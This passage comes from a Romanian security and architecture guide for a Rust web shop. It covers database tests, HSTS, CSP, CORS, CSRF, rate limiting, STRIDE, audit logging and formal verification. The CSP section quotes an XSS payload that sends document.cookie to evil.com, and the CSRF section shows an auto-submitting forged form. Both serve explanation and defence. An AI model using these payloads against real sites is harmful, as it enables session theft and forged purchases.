? A accepta noua variantă? (y/N)
```

---

## 13. Integration Testing — Teste end-to-end cu DB reală (Analiză aprofundată)

> *„Un test fără DB e ca un avion în simulator — util, dar nu e zbor real."*

### 13.1 Problema testelor cu DB

Testele cu DB sunt lente, fragile și greu de setat. **Dar sunt singura modalitate de a verifica că SQL-ul e corect.** Mock-urile nu prind:
- Greșeli de sintaxă SQL (`SELECT` vs `SLECT`)
- Coloane lipsă (ai uitat de migrare)
- Tipuri greșite (`INTEGER` vs `BIGINT`)
- Indexuri lipsă (query-ul merge, dar e lent)
- Contraints (UNIQUE, FOREIGN KEY)
- Trigger-e și funcții SQL

### 13.2 Soluția în shop-mvp — Teste care merg pe DB reală (Docker)

```rust
#[cfg(test)]
mod db_tests {
    use sqlx::{PgPool, Row};

    /// Conectare la DB reală (Docker). Single source of truth.
    async fn get_pool() -> PgPool {
        let url = std::env::var("DATABASE_URL")
            .unwrap_or_else(|_| "postgresql://postgres:123123@localhost:5432/test".into());
        PgPool::connect(&url).await.expect("DB connect")
    }

    /// Verifică că toate coloanele din products există.
    /// Dacă uiți să adaugi o coloană în migrare, testul crapă.
    #[tokio::test]
    async fn test_products_has_all_columns() {
        let pool = get_pool().await;
        let rows = sqlx::query(
            "SELECT column_name FROM information_schema.columns WHERE table_name='products'"
        )
            .fetch_all(&pool).await.expect("query");
        let cols: Vec<String> = rows.iter().map(|r| r.get::<String, _>("column_name")).collect();
        
        for c in &["id", "brand", "name", "slug", "category_id", "specs", "price_new", "created_at"] {
            assert!(cols.contains(&c.to_string()), "Coloana lipsă în products: {c}");
        }
    }

    /// Verifică că orders are coloanele de plată.
    /// Dacă schimbi providerul de plată și uiți coloanele, testul te anunță.
    #[tokio::test]
    async fn test_orders_has_payment_columns() {
        let pool = get_pool().await;
        let rows = sqlx::query(
            "SELECT column_name FROM information_schema.columns WHERE table_name='orders'"
        )
            .fetch_all(&pool).await.expect("query");
        let cols: Vec<String> = rows.iter().map(|r| r.get::<String, _>("column_name")).collect();
        
        for c in &["id", "status", "payment_status", "total_bani", "payment_provider", "payment_provider_id"] {
            assert!(cols.contains(&c.to_string()), "Coloana lipsă în orders: {c}");
        }
    }

    /// Test simplu: poți scrie și citi un produs?
    #[tokio::test]
    async fn test_crud_product() {
        let pool = get_pool().await;
        
        // INSERT
        sqlx::query("INSERT INTO products (brand, name, slug, price_new) VALUES ($1, $2, $3, $4)")
            .bind("Test Brand")
            .bind("Test Product")
            .bind("test-product")
            .bind(1000)
            .execute(&pool).await.expect("INSERT");
        
        // SELECT
        let row = sqlx::query("SELECT brand, name FROM products WHERE slug = $1")
            .bind("test-product")
            .fetch_one(&pool).await.expect("SELECT");
        
        assert_eq!(row.get::<String, _>("brand"), "Test Brand");
        assert_eq!(row.get::<String, _>("name"), "Test Product");
        
        // Cleanup
        sqlx::query("DELETE FROM products WHERE slug = $1")
            .bind("test-product")
            .execute(&pool).await.expect("DELETE");
    }
}
```

### 13.3 Principii pentru teste cu DB

1. **Testează contra unei DB reale** (Docker), nu mock-uri — altfel nu prinzi bug-uri de SQL
2. **Folosește `#[tokio::test]`** pentru operații async
3. **Curăță datele între teste** — fiecare test pornește de la o stare curată
4. **Nu depinde de ordinea testelor** — fiecare test e independent
5. **Rulează-le în paralel** — fiecare test are propria tranzacție
6. **Nu lăsa date în urmă** — DELETE/ROLLBACK după fiecare test

---

# Partea a IV-a — Securitate Web

---

## 14. OWASP ASVS Level 1 — Security Baseline Verificabil

### 14.1 Ce e ASVS

OWASP Application Security Verification Standard e un standard internațional care definește **cerințe verificabile** pentru securitatea aplicațiilor web. Nivelul 1 = "security baseline" — minimul necesar pentru orice aplicație web.

### 14.2 Audit ASVS Level 1 pentru shop-mvp — Scor: 100% ✅

| Capitol | Cerință | Status | Implementare |
|---------|---------|--------|-------------|
| **V2: Authentication** | Verify credentials, prevent brute force | ✅ | JWT HttpOnly + rate limiting |
| **V2.1** | Password minimum length, hashing | ✅ | Argon2, min 8 chars |
| **V3: Session Management** | HttpOnly, Secure, SameSite cookies | ✅ | |
| **V4: Access Control** | Principle of least privilege | ✅ | Capability-based architecture |
| **V5: Input Validation** | Validate all input on server | ✅ | Tera auto-escape, form validation |
| **V5.1** | Reject invalid encoding | ✅ | UTF-8 only, reject non-UTF8 |
| **V6: Output Encoding** | Context-appropriate encoding | ✅ | Tera auto-escape HTML |
| **V7: Cryptography** | Use strong algorithms | ✅ | Argon2, SHA-256 HMAC |
| **V8: Data Protection** | Encrypt in transit | ✅ | TLS, CSP |
| **V8.3** | Cache-Control for sensitive data | ✅ | `no-store` pe auth/checkout/admin |
| **V9: Communication** | TLS, HSTS | ✅ | `Strict-Transport-Security` |
| **V10: Malicious Code** | No eval(), no inline scripts | ✅ | CSP: explicit script-src |
| **V11: Business Logic** | Verify workflow integrity | ✅ | PRG pattern, capability-based |
| **V12: File Upload** | Limit size, validate type | ✅ | N/A (no uploads) |
| **V13: API** | RESTful, rate limited | ✅ | |
| **V14: Config** | No default creds, no debug in prod | ✅ | `.env` in gitignore, `APP_ENV=dev` |

---

## 15. HSTS — HTTP Strict-Transport-Security (Analiză aprofundată)

> *„HSTS face imposibil un atac pe care poate nici nu știai că-l poți primi."*

### 15.1 Ce e și de ce e necesar

HSTS (Strict-Transport-Security) **forțează** browserul să folosească HTTPS pentru TOATE conexiunile viitoare. Fără HSTS, un atacator face un atac **SSL stripping**: interceptează primul request HTTP și servește o versiune HTTP a site-ului, furând datele.

**Atacul fără HSTS:**
```
User: http://shop.ro
      │
Attacker: interceptează → servește HTTP simplu → vede parole, tokeni, carduri
      │
Server: știe doar de HTTPS, dar browserul a fost păcălit
```

**Cu HSTS:**
```
User: http://shop.ro
      │
Browser: "am văzut HSTS acum 1 an → DIRECT HTTPS, nu mai trimit HTTP"
      │
Server: request HTTPS, sigur
```

### 15.2 Cum funcționează

```
Browser ─── request HTTP ──▶ Server
          ◀── 301 HTTPS ─────
          ◀── HSTS: max-age=31536000 ── (1 an)
          
Browser  (salvează: "shop.ro e doar HTTPS pentru 1 an")
          
Browser ─── request HTTP ──▶ (nici măcar nu trimite — direct HTTPS)
```

### 15.3 Implementare în shop-mvp

```rust
// În security_headers middleware — deja activ:
parts.headers.insert(
    axum::http::header::HeaderName::from_static("strict-transport-security"),
    axum::http::HeaderValue::from_static("max-age=31536000; includeSubDomains"),
);
```

**Parametri:**
- `max-age=31536000` = 1 an (cât timp browserul păstrează această regulă)
- `includeSubDomains` = se aplică și la `admin.shop.ro`, `api.shop.ro`, etc.
- `preload` (opțional) = pentru includerea în lista preload a browserelor

### 15.4 Verificare

```bash
curl -sI http://localhost:3001/health | grep -i strict-transport
# → strict-transport-security: max-age=31536000; includeSubDomains
```

### 15.5 Risc fără HSTS

| Fără HSTS | Cu HSTS |
|-----------|---------|
| Atac SSL stripping în prima vizită | Imposibil — browserul știe dinainte |
| Atac SSL stripping în rețea Wi-Fi publică | Imposibil — conexiunea e direct HTTPS |
| Cookie-uri trimise pe HTTP | Imposibil — cookie-urile au Secure flag + HSTS |

---

## 16. CSP — Content Security Policy în Profunzime (Analiză aprofundată)

> *„CSP e primul tău gardian. Dacă XSS trece de el, restul e teorie."*

### 16.1 Ce e CSP

Content Security Policy e un header HTTP care spune browserului **ce resurse poate încărca și ce acțiuni poate executa**. E prima și cea mai importantă linie de apărare împotriva XSS.

**Fără CSP:** Un atacator poate injecta un `<script>fetch('https://evil.com/'+document.cookie)</script>` și fura toate cookie-urile.

**Cu CSP:** Browserul blochează execuția oricărui script care nu vine dintr-o sursă permisă explicit.

### 16.2 CSP-ul curent în shop-mvp

```
default-src 'self';                                          # Totul implicit: doar aceeași sursă
script-src 'self' https://cdn.tailwindcss.com;               # Script-uri: doar local + Tailwind CDN
style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com; # Stiluri: local + inline + Tailwind
img-src 'self' data:;                                         # Imagini: local + inline base64
form-action 'self';                                            # Form-uri: doar spre același domeniu
base-uri 'self';                                               # Base tag: doar același domeniu
```

### 16.3 Fiecare directivă explicată

| Directivă | Ce blochează | De ce e așa |
|-----------|-------------|-------------|
| `default-src 'self'` | Orice resursă din alt domeniu | Dacă uiți o directivă, asta e fallback-ul |
| `script-src 'self'` | Script-uri inline (`<script>...`) | XSS clasic. Tailwind CDN e singura excepție |
| `style-src 'self' 'unsafe-inline'` | Stiluri externe nepermise | Tera generează clase inline; fără asta, site-ul e nestilizat |
| `img-src 'self' data:` | Imagini externe | Previne pixelii de tracking |
| `form-action 'self'` | Form-uri care POST-ează în altă parte | CSRF — form-ul merge doar la același domeniu |
| `base-uri 'self'` | Tag-uri `<base>` din alt domeniu | Previne redirecționarea tuturor link-urilor relative |

### 16.4 Plan de întărire

| Faza | script-src | style-src | Când |
|------|-----------|-----------|------|
| Dev (acum) | `'self'` + CDN | `'self'` + `'unsafe-inline'` + CDN | Acum |
| Producție | `'self'` (build Tailwind local) | `'self'` + `'unsafe-inline'` | La release |
| Strict | `'self'` (build local) | `'self'` | Când eliminăm inline styles |

| Faza | script-src | style-src | Status |
|------|-----------|-----------|--------|
| Dev (acum) | `'self'` + CDN | `'self' 'unsafe-inline'` + CDN | ✅ |
| Producție | `'self'` (build Tailwind local) | `'self'` (fără inline) | 🔜 |
| Strict | `'self'` + nonce | `'self'` | 🔜 |

### 16.5 Verificare

```bash
curl -sI http://localhost:3001/ | grep -i content-security
# → content-security-policy: default-src 'self'; script-src ...
```

---

## 17. CORS — Cross-Origin Resource Sharing

### 17.1 Ce e

CORS controlează ce domenii pot face request-uri către aplicația ta. Fără CORS, un atacator poate face request-uri din browserul victimei către API-ul tău.

### 17.2 În shop-mvp

```rust
// CORS deschis doar pentru development
// La producție: restrictionează la domeniul propriu
let cors = CorsLayer::new()
    .allow_origin(Any)  // 🔜 Schimbă în 'self' la producție
    .allow_methods(Any)
    .allow_headers(Any);
```

### 17.3 Pericolul CORS deschis

`AllowOrigin::any()` (`*`) e echivalent cu „orice site poate face request-uri la API-ul tău". Asta înseamnă:
- Un script pe `evil.com` poate face fetch la `shop.ro/api/*`
- Poate citi răspunsurile (inclusiv date personale)
- Poate face POST-uri în numele utilizatorului

**Regula de aur:**
> La producție, CORS = `AllowOrigin::exact("https://shop.ro")`. Niciodată `any()`.

---

## 18. CSRF — Cross-Site Request Forgery Protection (Analiză aprofundată)

> *„Un formular pe un site rău poate face un POST la site-ul tău. Cookie-ul e trimis automat de browser."*

### 18.1 Problema

```
Site atacator (evil.com):
  <form action="https://shop.ro/cart/add" method="POST">
    <input name="product_id" value="999">
    <input name="qty" value="999">
  </form>
  <script>document.forms[0].submit()</script>

Browserul victimei:
  - E autentificat pe shop.ro (are cookie)
  - Cookie-ul e trimis AUTOMAT la shop.ro, fără ca evil.com să-l vadă
  - Rezultat: 999 de produse în coș
```

### 18.2 Cele 3 straturi de protecție în shop-mvp

| Strat | Metodă | Status | Explicație |
|-------|--------|--------|-----------|
| 1 | **SameSite cookie** | ✅ | `SameSite=Lax` — cookie-ul nu e trimis la POST-uri cross-site |
| 2 | **CSP form-action** | ✅ | `form-action 'self'` — form-urile POST-ează doar la același domeniu |
| 3 | **CSRF token** | 🔜 | Nu e necesar momentan (SameSite + CSP sunt suficiente) |

### 18.3 Verificare

```bash
curl -s -o /dev/null -w "%{http_code}" -X POST \
  -d "product_id=1&qty=1" \
  http://localhost:3001/cart/add
# → 302 (redirect) — fără cookie valid, nu se întâmplă nimic
```

---

## 19. Rate Limiting — Protecție împotriva abuzului (Analiză aprofundată)

> *„Fără rate limiting, login-ul tău e o ușă deschisă pentru brute force."*

### 19.1 Ce e și de ce e critic

Rate limiting limitează numărul de request-uri dintr-o anumită perioadă. **Fără el:**
- 1M de parole încercate pe /login într-o oră
- Conturi furate prin brute force
- Serverul căzut sub sarcină (DoS)

### 19.2 Implementarea completă în shop-mvp

```rust
/// Rate limiter în-memory cu sliding window.
/// Thread-safe prin Mutex.
pub struct RateLimiter {
    requests: Mutex<HashMap<String, Vec<Instant>>>,
    max_requests: usize,
    window_secs: u64,
}

impl RateLimiter {
    pub fn new(max_requests: usize, window_secs: u64) -> Self {
        Self {
            requests: Mutex::new(HashMap::new()),
            max_requests,
            window_secs,
        }
    }

    /// Verifică dacă un client (identificat prin IP/email) a depășit limita.
    pub fn check(&self, key: &str) -> Result<(), StatusCode> {
        let mut map = self.requests.lock().unwrap();
        let now = Instant::now();
        let entry = map.entry(key.to_string()).or_default();
        entry.retain(|t| now.duration_since(*t) < Duration::from_secs(self.window_secs));
        if entry.len() >= self.max_requests {
            return Err(StatusCode::TOO_MANY_REQUESTS); // 429
        }
        entry.push(now);
        Ok(())
    }
}
```

### 19.3 Configurare

```rust
let login_limiter = RateLimiter::new(10, 60);    // 10 încercări / min / IP
let signup_limiter = RateLimiter::new(3, 60);     // 3 conturi / min / IP
let checkout_limiter = RateLimiter::new(5, 60);   // 5 checkout-uri / min / user
```

### 19.4 Răspunsul 429

```http
HTTP/1.1 429 Too Many Requests
Retry-After: 60
Content-Type: text/plain; charset=utf-8

Prea multe încercări. Încearcă din nou peste 60 de secunde.
```

---

## 20. STRIDE Threat Modeling — Identifică sistematic amenințările (Analiză aprofundată)

> *„Nu poți proteja ce nu știi că există. STRIDE te ajută să știi."*

### 20.1 Modelul STRIDE — Cele 6 clase de amenințări

| Litera | Categoria | În shop-mvp | Contramăsura |
|--------|-----------|-------------|-------------|
| **S** | **Spoofing** — falsificarea identității | Atacator încearcă să se autentifice ca alt user | JWT semnat HMAC + rate limiting 10/min |
| **T** | **Tampering** — modificarea datelor | Atacator modifică date în tranzit | HTTPS + CSP + body size limit 2MB |
| **R** | **Repudiation** — negarea acțiunii | Userul neagă că a plasat comanda | Log în DB: `orders.created_at` + `orders.user_id` |
| **I** | **Information Disclosure** — expunerea datelor | Atacator accesează comenzi străine | Capability-based: vezi doar propriile comenzi |
| **D** | **Denial of Service** — refuzul serviciului | Atacator inunda serverul cu request-uri | Rate limiting + timeout + body limit |
| **E** | **Elevation of Privilege** — escaladare | User devine admin | Capability-based + role separation |

### 20.2 Matricea STRIDE completă

| Endpoint | S | T | R | I | D | E | Riscuri principale |
|----------|---|---|---|---|---|---|-------------------|
| `POST /login` | 🔴 | 🟢 | 🟢 | 🟢 | 🔴 | 🟢 | Brute force, DoS |
| `POST /checkout` | 🟡 | 🟡 | 🔴 | 🟡 | 🟢 | 🟢 | Dublă plată, fraudă |
| `GET /admin` | 🟢 | 🟢 | 🔴 | 🔴 | 🟢 | 🔴 | Date sensibile expuse |
| `POST /cart/add` | 🟢 | 🟡 | 🟢 | 🟢 | 🟢 | 🟢 | Manipulare cantități |
| `POST /admin/product/new` | 🟢 | 🔴 | 🔴 | 🔴 | 🟢 | 🔴 | Creare produs fraudulos |
| `POST /order/{id}/pay` | 🟡 | 🔴 | 🔴 | 🟡 | 🟢 | 🟢 | Plată frauduloasă |

### 20.3 Cum aplici STRIDE în fiecare sprint

1. Înainte de a implementa un feature nou, desenezi matricea STRIDE
2. Identifici amenințările cu 🟡 și 🔴
3. Implementezi contramăsuri pentru fiecare 🔴
4. Reevaluezi după implementare
5. Documentezi în README sau în arhitectură

---

# Partea a V-a — Arhitectură

---

## 21. Hexagonal Architecture — Ports & Adapters Formalizat

### 21.1 Ce e

Hexagonal Architecture (Alistair Cockburn, 2005): aplicația comunică cu exteriorul doar prin **port-uri** (interfețe), iar **adaptoarele** implementează acele port-uri pentru tehnologii concrete.

```
┌─────────────────────────────────────────────────┐
│                   Aplicația                       │
│                                                   │
│  ┌──────── Port-uri (trait-uri) ────────┐       │
│  │  Command: PlaceOrder, CancelOrder    │       │
│  │  Query: GetOrder, GetProducts        │       │
│  └──────────────────────────────────────┘       │
│           ▲          ▲          ▲                │
│           │          │          │                │
│  ┌────────┴──┐ ┌────┴─────┐ ┌──┴──────────┐   │
│  │  Web     │ │   Stripe │ │  Postgres   │   │
│  │  (Axum)  │ │  Adapter │ │  Adapter    │   │
│  └──────────┘ └──────────┘ └─────────────┘   │
│                                                 │
│  ┌────────── Adaptoare ──────────────┐        │
│  │  HTTP in │ Stripe API │ SQLx      │        │
│  └────────────────────────────────────┘        │
└─────────────────────────────────────────────────┘
```

### 21.2 În shop-mvp

```rust
// Port
#[async_trait]
pub trait PaymentRepo: Send + Sync {
    async fn create_payment(&self, amount: u32, currency: &str) -> Result<PaymentIntent, PaymentError>;
    async fn refund(&self, payment_id: &str, amount: Option<u32>) -> Result<(), PaymentError>;
}

// Adapter 1: Stripe
impl PaymentRepo for StripePayment { ... }

// Adapter 2: Retry (decorator)
impl<T: PaymentRepo> PaymentRepo for RetryPayment<T> { ... }

// Adapter 3: Mock (test)
impl PaymentRepo for MockPayment { ... }
```

### 21.3 Feature flags

```toml
[features]
default = ["lego"]
lego = []       # Dynamic dispatch (dev)
hot_path = []   # Monomorphized (prod)
```

```rust
#[cfg(feature = "lego")]
pub type DynPaymentRepo = Arc<dyn PaymentRepo>;
#[cfg(not(feature = "lego"))]
pub type DynPaymentRepo = StripePayment;
```

---

## 22. Defense in Depth — Stratificarea securității (Analiză aprofundată)

> *„Niciun lacăt nu e de nespart. Pune 7 lacături."*

### 22.1 Principiul — De ce un singur strat nu e suficient

Niciun strat de securitate nu e perfect. Un CSP poate fi configurat greșit. Un token JWT poate fi furat. Un input poate fi validat incomplet. **Stratificarea** asigură că dacă un strat e spart, următorul încă protejează.

### 22.2 Cele 8 straturi în shop-mvp

```
┌──────────────────────────────────────────────┐
│  Strat 7: CSP + HSTS + Headere              │ ← Primul contact (rețea)
├──────────────────────────────────────────────┤
│  Strat 6: CORS + CSRF (SameSite)            │ ← Al doilea (protocol)
├──────────────────────────────────────────────┤
│  Strat 5: Rate Limiting                      │ ← Al treilea (volum)
├──────────────────────────────────────────────┤
│  Strat 4: Authentication (JWT HttpOnly)      │ ← Al patrulea (identitate)
├──────────────────────────────────────────────┤
│  Strat 3: Capability-based Authorization     │ ← Al cincilea (permisiuni)
├──────────────────────────────────────────────┤
│  Strat 2: Input Validation (parse don't validate) │ ← Al șaselea (date)
├──────────────────────────────────────────────┤
│  Strat 1: PRG Pattern + Zero JS              │ ← Al șaptelea (logică)
├──────────────────────────────────────────────┤
│  Strat 0: Rust type system + borrow checker  │ ← Ultimul (memorie)
└──────────────────────────────────────────────┘
```

### 22.3 Exemplu: Protejarea checkout — 8 straturi în acțiune

```
Atac: XSS → fură cookie → accesează /checkout → plătește cu cardul altuia

Strat 7 (CSP):         Blochează XSS — script-src 'self', fără inline scripts
Strat 6 (CORS/CSRF):   SameSite=Lax — cookie-ul nu pleacă din domeniu
Strat 5 (Rate limit):  5 checkout-uri/minut — atacatorul e încetinit
Strat 4 (JWT):         HttpOnly — cookie-ul nu poate fi citit de JS
Strat 3 (Capability):  Checkout handler vede doar OrderState — nu poate accesa refund
Strat 2 (Validation):  Form-ul e validat server-side — nu poți injecta comenzi
Strat 1 (PRG):         POST → 302 → GET — dubla plată e imposibilă
Strat 0 (Rust):        Zero buffer overflow, zero use-after-free, zero data race
```

---

## 23. Zero Trust Architecture — Nu avea încredere, verifică (Analiză aprofundată)

### 23.1 Principiul

> **"Never trust, always verify."**

În arhitectura tradițională, odată ce ești în rețea, ai acces. În Zero Trust, **fiecare request e verificat** indiferent de originea lui.

### 23.2 În shop-mvp

```rust
// ✅ Zero Trust în acțiune:
// Chiar și request-urile din interiorul rețelei sunt verificate

async fn admin_handler(State(state): State<AdminState>, headers: HeaderMap) -> Response {
    // 1. Verifică token-ul JWT (autentificare)
    let user = verify_token(&headers)?;
    
    // 2. Verifică rolul (authorizare)
    if user.role != "admin" {
        return StatusCode::FORBIDDEN.into_response();
    }
    
    // 3. Verifică capabilitățile (capability-based)
    // AdminState deja restricționează accesul
    
    // 4. Loghează accesul (audit)
    log_admin_action(&user, "accessed admin panel");
    
    process_request(state).await
}
```

### 23.3 Principii Zero Trust pentru web

1. **Verifică tot** — fiecare request, indiferent de sursă
2. **Minim privilege** — fiecare handler primește doar ce-i trebuie
3. **Assume breach** — proiectează ca și cum ai fi deja spart
4. **Audit tot** — loghează toate acțiunile sensibile
5. **Segmentare** — separate physical/digitală între componente

---

## 24. Observability — Logging, Metrics și Tracing (Analiză aprofundată)

> *„Dacă nu poți vedea ce se întâmplă în aplicație, ești orb în producție."*

### 24.1 Cele 3 piloni ai observabilității

```
Observability = Logging + Metrics + Tracing
```

| Pillar | Ce măsoară | În shop-mvp | Întrebare la care răspunde |
|--------|-----------|-------------|---------------------------|
| **Logging** | Evenimente discrete | `tracing` — request ID, SQL timing, panic hook | „Ce s-a întâmplat?" |
| **Metrics** | Agregări numerice | DB query counter, request count, durată medie | „Cât de des se întâmplă?" |
| **Tracing** | Fluxul unui request | Request ID propagat prin toate componentele | „Unde s-a întâmplat?" |

### 24.2 Implementarea în shop-mvp

```rust
// Logging cu request ID — fiecare request are un ID unic
async fn request_timing<B>(req: Request<B>, next: Next<B>) -> Response {
    let request_id = Uuid::new_v4();
    let start = Instant::now();
    let method = req.method().clone();
    let path = req.uri().path().to_string();

    let resp = next.run(req).await;
    let duration = start.elapsed();
    let status = resp.status();

    tracing::info!(
        target: "request",
        request_id = %request_id,
        method = %method,
        path = %path,
        status = status.as_u16(),
        duration_ms = duration.as_millis(),
        "Request procesat"
    );
    resp
}

// DB query counter — câte query-uri face fiecare request
pub fn count_query(sql: &str) {
    DB_QUERY_COUNT.fetch_add(1, Ordering::Relaxed);
}

// Panic hook — prinde crash-urile în fișier
std::panic::set_hook(Box::new(move |info| { /* ... */ }));
```

### 24.3 Comenzi utile pentru debugging

```bash
# Câte request-uri pe minut?
grep "Request procesat" logs/shop-mvp.log* | wc -l

# Câte query-uri DB per request?
# Vezi în /admin/logs

# Cele mai lente request-uri?
grep "duration_ms" logs/shop-mvp.log* | sort -t= -k2 -rn | head -5
```

---

## 25. Error Handling Strategy — Recuperare elegantă

### 25.1 Principiul

> O eroare nu trebuie să ducă la o pagină albă sau la un crash silențios.

### 25.2 Strategia în shop-mvp

```rust
// 1. Panic hook — prinde crash-urile în log
std::panic::set_hook(Box::new(move |info| {
    let panic_log = format!(
        "=== PANIC ===\n{}\nLocation: {}\nBacktrace:\n{:?}\n==============",
        info.to_string(),
        info.location().map(|l| l.to_string()).unwrap_or_default(),
        std::backtrace::Backtrace::capture(),
    );
    let _ = std::fs::OpenOptions::new()
        .create(true).append(true).open("logs/panic.log")
        .and_then(|mut f| std::io::Write::write_all(&mut f, panic_log.as_bytes()));
    eprintln!("{}", panic_log);
}));

// 2. Template error logging — nu lăsa Tera să înghită erori
renderer.render(template, &ctx, base_path, is_htmx)
    .map_err(|e| {
        tracing::error!(target: "template", "Eșec render '{}': {}", template, e);
        (StatusCode::INTERNAL_SERVER_ERROR, e)
    })

// 3. Erori user-friendly — cutie roșie + link "← înapoi"
fn error_redirect(dest: &str, msg: &str) -> Response {
    (StatusCode::FOUND, [
        ("Location", format!("{}?error={}", dest, urlencode(msg))),
    ]).into_response()
}

// 4. Error page în template
// {% if error %}
// <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded">
//     <p>{{ error }}</p>
//     <a href="javascript:history.back()" class="underline">← înapoi</a>
// </div>
// {% endif %}
```

### 25.3 Categorii de erori

| Tip | Răspuns | Exemplu |
|-----|---------|---------|
| **Validare** | 302 → formular cu `?error=` | Email invalid |
| **Autentificare** | 401 / 302 → login | Token expirat |
| **Autorizare** | 403 | Nu ești admin |
| **Not Found** | 404 | Produsul nu există |
| **Conflict** | 409 | Email deja folosit |
| **Rate Limit** | 429 | Prea multe încercări |
| **Internal** | 500 + log | DB down, Stripe timeout |

---

## 26. Non-Repudiation — Audit Log și Imutabilitate

### 26.1 Problema

Un user poate nega că a plasat o comandă sau că a făcut o acțiune. Dacă nu ai log-uri, nu poți dovedi contrariul.

### 26.2 Soluția

```sql
-- Tabelă de audit imutabilă (append-only)
CREATE TABLE audit_log (
    id BIGSERIAL PRIMARY KEY,
    timestamp TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    user_id UUID,
    action TEXT NOT NULL,        -- 'order.created', 'payment.refund', 'admin.login'
    entity_type TEXT NOT NULL,    -- 'order', 'payment', 'user'
    entity_id TEXT NOT NULL,      -- UUID-ul entității
    details JSONB,                -- Detalii suplimentare (preț, status, etc.)
    ip_address INET,
    user_agent TEXT
);

-- Index pentru căutare rapidă
CREATE INDEX idx_audit_timestamp ON audit_log(timestamp);
CREATE INDEX idx_audit_user ON audit_log(user_id);
CREATE INDEX idx_audit_action ON audit_log(action);
```

```rust
pub async fn log_audit(
    db: &PgPool,
    user_id: Option<Uuid>,
    action: &str,
    entity_type: &str,
    entity_id: &str,
    details: serde_json::Value,
    ip: Option<std::net::IpAddr>,
) -> Result<(), sqlx::Error> {
    sqlx::query(
        "INSERT INTO audit_log (user_id, action, entity_type, entity_id, details, ip_address)
         VALUES ($1, $2, $3, $4, $5, $6)"
    )
    .bind(user_id)
    .bind(action)
    .bind(entity_type)
    .bind(entity_id)
    .bind(details)
    .bind(ip)
    .execute(db)
    .await?;
    Ok(())
}
```

### 26.3 Ce logăm

| Acțiune | De ce |
|---------|-------|
| `user.login` | Detectare acces neautorizat |
| `user.signup` | Creare conturi frauduloase |
| `order.created` | Confirmare comandă |
| `order.paid` | Verificare plată |
| `order.refunded` | Prevenire fraudă |
| `order.cancelled` | Customer support |
| `admin.login` | Acces administrativ |
| `admin.product.*` | Modificare catalog |
| `payment.failed` | Diagnostic plăți |
| `rate_limit.hit` | Detectare atacuri |

---

# Partea a VI-a — Verificare Formală și Advanced

---

## 27. Formal Verification — Verus, Dafny, Z3

### 27.1 Ce e

Verificarea formală **demonstrează matematic** că un program e corect. Nu "pare corect", nu "trece testele" — e **demonstrat**.

### 27.2 Când e necesară

| Volum lunar | Abordare |
|------------|----------|
| **<$100K** | Teste tradiționale + proptest |
| **$100K-$1M** | + fuzz + snapshot testing |
| **>$1M** | + Verus pentru logica de prețuri |
| **>$10M** | + Z3 pentru workflow-uri critice |
| **Aviație/Medical** | + Certificare formală completă |

### 27.3 Verus (Rust, Microsoft)

```rust
// Verus — verificare formală pentru Rust
verus! {
    pub fn calculate_total(qty: u32, price: u32) -> (total: u32)
        requires
            qty > 0,
            price > 0,
            qty * price <= u32::MAX,
        ensures
            total == qty * price,
    {
        qty * price
    }
}
```

### 27.4 Z3 (SMT Solver, Microsoft Research)

Z3 poate demonstra automat proprietăți:

```rust
// Z3 demonstrează:
// Pentru ORICE x, y: (x + y) - y == x
// NICIUN workflow de checkout nu poate ajunge în "paid" fără să cheme Stripe
// Orice sumă parțială ≤ suma totală
```

---

## 28. Semantic Versioning pentru API-uri

### 28.1 Principiul

```
MAJOR.MINOR.PATCH
  ↑      ↑      ↑
  │      │      └── Bug fix (compatibil)
  │      └──────── Feature nou (compatibil)
  └─────────────── Breaking change (incompatibil)
```

### 28.2 Pentru API-uri REST

```http
GET /api/v1/products
GET /api/v2/products  # Breaking change

Content-Type: application/vnd.shop.v1+json
Content-Type: application/vnd.shop.v2+json  # Versionare prin header
```

---

## 29. OWASP Top 10 — Mapping pentru shop-mvp

| # | Vulnerabilitate | În shop-mvp | Contramăsura |
|---|----------------|-------------|-------------|
| 1 | **Broken Access Control** | Capability-based | Compilatorul verifică |
| 2 | **Cryptographic Failures** | Argon2, SHA-256, HTTPS | |
| 3 | **Injection** (SQL, XSS) | SQLx + Tera auto-escape | |
| 4 | **Insecure Design** | PRG, capability, defense in depth | |
| 5 | **Security Misconfiguration** | `.env` in gitignore, `APP_ENV=dev` | |
| 6 | **Vulnerable Components** | Dependințe actualizate | `cargo audit` |
| 7 | **Authentication Failures** | JWT + rate limiting | |
| 8 | **Data Integrity Failures** | CSP, HSTS, HTTPS | |
| 9 | **Logging & Monitoring** | `tracing`, request ID, DB counter | |
| 10 | **SSRF** | N/A (nu facem request-uri externe din input) | |

---

# Partea a VII-a — Concluzii

---

## 30. Matricea Completa — Impact vs Efort

| # | Concept | Categorie | Efort | Impact bug-uri | Implementat |
|---|---------|-----------|-------|---------------|-------------|
| 1 | **PRG Pattern** | Arhitectură | 0 | Elimină dublă procesare | ✅ |
| 2 | **HN Philosophy (zero JS)** | Arhitectură | 0 | Elimină bug-uri JS | ✅ |
| 3 | **seL4 Capability** | Arhitectură | 0 | Previne escalation | ✅ |
| 4 | **LEGO modules** | Arhitectură | 0 | Izolare, testabilitate | ✅ |
| 5 | **Security headers** | Securitate | 0 | XSS, clickjacking | ✅ |
| 6 | **HSTS** | Securitate | 15 min | Downgrade attacks | ✅ |
| 7 | **Cache-Control** | Securitate | 15 min | Date sensibile în cache | ✅ |
| 8 | **CSP** | Securitate | 30 min | XSS | ✅ |
| 9 | **Rate limiting** | Securitate | 0 | Brute force | ✅ |
| 10 | **Rust borrow checker** | Limbaj | 0 | Memory safety | ✅ |
| 11 | **Parse, don't validate** | Tipuri | 2-3 zile | Input invalid garantat | ❌ |
| 12 | **Type-state pattern** | Tipuri | 3-5 zile | Stări invalide imposibile | ❌ |
| 13 | **Newtype pattern** | Tipuri | 1-2 zile | Confuzie tipuri | ❌ |
| 14 | **Property-based testing** | Testare | 1-2 zile | Edge cases automate | ❌ |
| 15 | **OWASP ASVS L1 audit** | Standard | 4-5 ore | Baseline securitate | ✅ 100% |
| 16 | **STRIDE audit** | Standard | 2-3 ore | Threat-uri identificate | ❌ |
| 17 | **Fuzz testing** | Testare | 3-5 zile | Vulnerabilități input | ❌ |
| 18 | **Snapshot testing** | Testare | 1 zi | Schimbări neașteptate | ❌ |
| 19 | **CSRF tokens** | Securitate | 2 zile | Cross-site forgery | 🟡 (SameSite) |
| 20 | **Non-repudiation log** | Securitate | 1 zi | Negarea acțiunilor | ❌ |
